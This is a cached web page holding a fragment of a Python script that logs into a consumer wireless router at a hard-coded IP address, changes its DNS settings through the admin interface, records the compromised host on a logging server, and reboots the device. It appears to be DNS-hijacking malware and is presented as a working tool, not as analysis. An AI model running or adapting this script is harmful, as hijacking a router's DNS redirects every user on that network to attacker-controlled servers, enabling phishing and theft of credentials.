...
<!-- saved from url=(0170)http://webcache.googleusercontent.com/search?q=cache:azeODzN2EYUJ:goldenkash.com/application/class/routers_py/router.RoteadorWirelessN300Mbps.py+&cd=2&hl=en&ct=clnk&gl=us -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="http://goldenkash.com/application/class/routers_py/router.RoteadorWirelessN300Mbps.py">--><base href="."><style>body{margin-left:0;margin-right:0;margin-top:0}#bN015htcoyT__google-cache-hdr{background:#f5f5f5;font:13px arial,sans-serif;text-align:left;color:#202020;border:0;margin:0;border-bottom:1px solid #cecece;line-height:16px;padding:16px 28px 24px 28px}#bN015htcoyT__google-cache-hdr *{display:inline;font:inherit;text-align:inherit;color:inherit;line-height:inherit;background:none;border:0;margin:0;padding:0;letter-spacing:0}#bN015htcoyT__google-cache-hdr a{text-decoration:none;color:#1a0dab}#bN015htcoyT__google-cache-hdr a:hover{text-decoration:underline}#bN015htcoyT__google-cache-hdr a:visited{color:#609}#bN015htcoyT__google-cache-hdr div{display:block;margin-top:4px}#bN015htcoyT__google-cache-hdr b{font-weight:bold;display:inline-block;direction:ltr}</style><style>pre{white-space:pre-wrap}</style></head><body><div id="bN015htcoyT__google-cache-hdr"><div><span>This is Google's cache of <a href="http://goldenkash.com/application/class/routers_py/router.RoteadorWirelessN300Mbps.py">http://goldenkash.com/application/class/routers_py/router.RoteadorWirelessN300Mbps.py</a>.</span>&nbsp;<span>It is a snapshot of the page as it appeared on Sep 16, 2018 13:43:50 GMT.</span>&nbsp;<span>The <a href="http://goldenkash.com/application/class/routers_py/router.RoteadorWirelessN300Mbps.py">current page</a> could have changed in the meantime.</span>&nbsp;<a href="http://support.google.com/websearch/bin/answer.py?hl=en&amp;p=cached&amp;answer=1687222"><span>Learn more</span>.</a></div><span style="display:inline-block;margin-top:8px;color:#717171"><span>Tip: To quickly find your search term on this page, press <b>Ctrl+F</b> or <b>⌘-F</b> (Mac) and use the find bar.</span></span></div><div style="position:relative; margin:8px;"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
...
header = {
    ...
    'Host':'177.185.89.105',
    'Origin':'http://177.185.89.105',
    'Referer':'http://177.185.89.105/login.asp',
...
try:
    login = router.post("http://"+host+"/LoginCheck", headers=header, data=data)
    if "index.asp" in login.content:
        pass
...
try:
    changeDNS = router.post("http://"+host+"/goform/AdvSetDns", data=data, header=header)
    os.system("cd /var/www/html/logs;php gravar.php "+host)
except Exception as e:
    pass

try:
    reboot = router.get("http://"+host+"/goform/SysToolReboot", header=header)
except Exception as e:
    pass
